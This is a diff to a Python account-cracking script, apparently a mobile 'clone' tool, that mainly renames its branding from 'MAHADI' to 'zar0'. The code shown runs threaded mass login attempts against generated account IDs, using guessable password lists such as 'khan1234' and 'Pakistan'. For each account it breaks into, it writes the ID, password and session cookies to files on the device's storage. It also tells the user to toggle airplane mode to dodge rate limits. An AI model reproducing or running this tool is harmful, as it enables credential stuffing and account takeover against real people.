@@ -13,13 +13,13 @@ from licensing.methods import Key, Helpers
 try:
     import concurrent.futures
 except ImportError:
-    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing futures !...\n')
+    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
     time.sleep(0.5)
     os.system('pip install pycurl')
 try: 
     import bs4
 except ImportError:
-    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing bs4 !...\n')
+    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
     time.sleep(0.5)
     os.system('pip install bs4')
 #━━━━[ COLORS ]━━━━#
@@ -175,7 +175,7 @@ import requests,random
 #def ua_valid():
   #  rr = random.randint
  #   rc = random.choice
-   # model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/MAHADI-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
+   # model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/zar0-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
   #  model = random.choice(model2)
 #    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    # return rc([redmi4])
@@ -226,7 +226,7 @@ if uxernamx=='GREEN.py':
     except:
         print('   Somting Wrong Bro')
         idx()
-    if 'MAHADI-XD' in readhead:
+    if 'zar0-XD' in readhead:
         pass
     else:
         idx()
@@ -266,32 +266,32 @@ class Process:
         c.close()
         return buffer.getvalue().decode('utf-8')
     def enroll(self):
-        mahadi()
+        zar0()
 
 #━━━━[ MAIN ]━━━━#
-def mahadi():
+def zar0():
     ____banner____()
     print(f'{rad}[{white}A{rad}] {green}KEEP ON FILE CLONE')
     print(f'{rad}[{white}B{rad}] {green}MAKE IT FILES')
     print(f'{rad}[{white}C{rad}] {green}KEEP ON RANDOM CLONE')
     print(f'{rad}[{white}C{rad}] {green}JOIN GROUP')
     print(f'{rad}[{white}C{rad}] {green}CONTRACK ADMIN');linex()
-    __Mahadi__ = input(f'{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}')
-    if __Mahadi__ in ['A','a','01','1']:__FILEX__()
-    elif __Mahadi__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
-    elif __Mahadi__ in ['C','c','03','3']:SETINGX()
-    elif __Mahadi__ in ['D','d','04','4']:os.system("xdg-open https://wa.me/+918389066877")
-    elif __Mahadi__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
-    else:print(f'\n[×]{rad} Choose Value Option... ');mahadi()
+    __zar0__ = input(f'{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}')
+    if __zar0__ in ['A','a','01','1']:__FILEX__()
+    elif __zar0__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
+    elif __zar0__ in ['C','c','03','3']:SETINGX()
+    elif __zar0__ in ['D','d','04','4']:os.system("xdg-open https://wa.me/+918389066877")
+    elif __zar0__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
+    else:print(f'\n[×]{rad} Choose Value Option... ');zar0()
 
 #━━━━[ SELECT MENU ]━━━━#
 def SETINGX():
     ____banner____()
     print(f"{cyan}▁▂▄▅▆{green}[{white}A{green}] {white}> {yellow}BD {green}[{white}B{green}] >{cyan} INDIA {green}[{white}C{green}] > {purple}PAK{cyan}▆▅▄▂▁");linex()
-    __Mahadii__ = input(f'{rad}[{white}◆{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
-    if __Mahadii__ in ['A','a','01','1']:RANDOM()
-    elif __Mahadii__ in ['B','b','02','2']:INDIA()
-    elif __Mahadii__ in ['C','c','03','3']:PAKISTAN()
+    __zar0i__ = input(f'{rad}[{white}◆{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
+    if __zar0i__ in ['A','a','01','1']:RANDOM()
+    elif __zar0i__ in ['B','b','02','2']:INDIA()
+    elif __zar0i__ in ['C','c','03','3']:PAKISTAN()
     else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()
 
 #━━━━[ BANGLADESH RANDOM ]━━━━#
@@ -310,7 +310,7 @@ def RANDOM():
         ck.append('N') 
     else:
         ck.append('N')
-    with tred(max_workers=35) as MahadiSefat:
+    with tred(max_workers=35) as zar0Sefat:
         ____banner____();tl = str(len(user))
         print(f'{rad}[{white}◆{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
         print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
@@ -318,7 +318,7 @@ def RANDOM():
         for love in user:
             ids = code+love
             passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
-            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
+            zar0Sefat.submit(__API__,ids,passlist,tl,ck)
     print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
 #━━━━[ INDIAN RANDOM ]━━━━#
 def INDIA():
@@ -336,7 +336,7 @@ def INDIA():
         ck.append('N') 
     else:
         ck.append('N')
-    with tred(max_workers=55) as MahadiSefat:
+    with tred(max_workers=55) as zar0Sefat:
         ____banner____();tl = str(len(user))
         print(f'{rad}[{white}◆{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
         print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
@@ -344,7 +344,7 @@ def INDIA():
         for love in user:
             ids = code+love
             passlist = [love,ids, '57575751', '57273200', '59039200']
-            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
+            zar0Sefat.submit(__API__,ids,passlist,tl,ck)
     print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
 #━━━━[ PAKISTAN RANDOM ]━━━━#
 def PAKISTAN():
@@ -362,7 +362,7 @@ def PAKISTAN():
         ck.append('N') 
     else:
         ck.append('N')
-    with tred(max_workers=55) as MahadiSefat:
+    with tred(max_workers=55) as zar0Sefat:
         ____banner____();tl = str(len(user))
         print(f'{rad}[{white}◆{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
         print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
@@ -370,7 +370,7 @@ def PAKISTAN():
         for love in user:
             ids = code+love
             au = love[:6];bu = ids[:8];passlist = [love,ids,au,bu, 'khankhan', 'khan khan', 'khan1234', 'khan12345', 'Pakistan', '203040']
-            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
+            zar0Sefat.submit(__API__,ids,passlist,tl,ck)
     print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
 #━━━━[ METHOD API ]━━━━#
 def __API__(ids,passlist,tl,ck):
@@ -393,14 +393,14 @@ def __API__(ids,passlist,tl,ck):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if "Y" in ck:
-                        print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{coki}');linex()
-                        open('/sdcard/MAHADI-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/zar0-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/zar0-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                         oks.append(cid)
                         break
                     else:
-                        print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        open('/sdcard/MAHADI-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        open('/sdcard/zar0-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/zar0-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                         oks.append(cid)
                         break 
             else:
@@ -414,7 +414,7 @@ def __API__(ids,passlist,tl,ck):
 def __FILEX__():
     global oks,cps
     ____banner____()
-    dfile = input(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}[{white}sdcard/mahadi.txt{rad}]\n{rad}[{white}◆{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
+    dfile = input(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}[{white}sdcard/zar0.txt{rad}]\n{rad}[{white}◆{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
@@ -427,7 +427,7 @@ def __FILEX__():
     for i in range(pass_lmit):
         dplist.append(input(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}[{white}firstlast first123 ETC{rad}]\n{rad}[{white}◆{rad}] {green}PASSWORD NO.{i+1} {white}▶︎ {yelloww}'));linex()
     __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1 {rad}({white}INDIA{rad})\n{rad}[{white}B{rad}] {green}METHOD M2 {rad}({white}BD/INDIA{rad})\n{rad}[{white}C{rad}] {green}METHOD M3 {rad}({white}BD/INDIA{rad})\n{rad}[{white}D{rad}] {green}METHOD M4 {rad}({white}BD/INDIA{rad})\n{rad}[{white}E{rad}] {green}METHOD M5 {rad}({white}MIX IDS{rad})\n{rad}[{white}F{rad}] {green}METHOD M6 {rad}({white}ALL COUNTRY{rad})\n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}◆{rad}] {green}SELECTION {white}▶︎ {yelloww}")
-    with ThreadPool(max_workers=30) as Mahadi:
+    with ThreadPool(max_workers=30) as zar0:
         ____banner____();total_ids = str(len(dx))
         print(f'{rad}[{white}◆{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad}┼{green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
         print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
@@ -436,19 +436,19 @@ def __FILEX__():
             ids,names = user.split('|')
             passlist = dplist
             if __METHOD__ in ["A","a"]:
-                Mahadi.submit(__MTDONEE__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["B","b"]:
-                Mahadi.submit(__MTDTWOO__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDTWOO__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["C","c"]:
-                Mahadi.submit(__MTDTHREE__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDTHREE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["D","d"]:
-                Mahadi.submit(__MTDFOUR__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDFOUR__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["E","e"]:
-                Mahadi.submit(__MTDFIVE__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDFIVE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["F","f"]:
-                Mahadi.submit(__MTDSIX__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDSIX__,ids,names,passlist,total_ids)
             else:
-                Mahadi.submit(__MTDONEE__,ids,names,passlist,total_ids)
+                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
     print('');linex()
     print(f"{rad}[{white}◆{rad}] {green}THE PROCESS HAS COMPLETE")
     print(f"{rad}[{white}◆{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
@@ -515,14 +515,14 @@ def __MTDONEE__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -608,14 +608,14 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -702,14 +702,14 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -795,14 +795,14 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -894,14 +894,14 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -984,14 +984,14 @@ def __MTDSIX__(ids, names, passlist, total_ids):
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                 oks.append(ids)
-                open('/sdcard/MAHADI-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[MAHADI-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/MAHADI-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
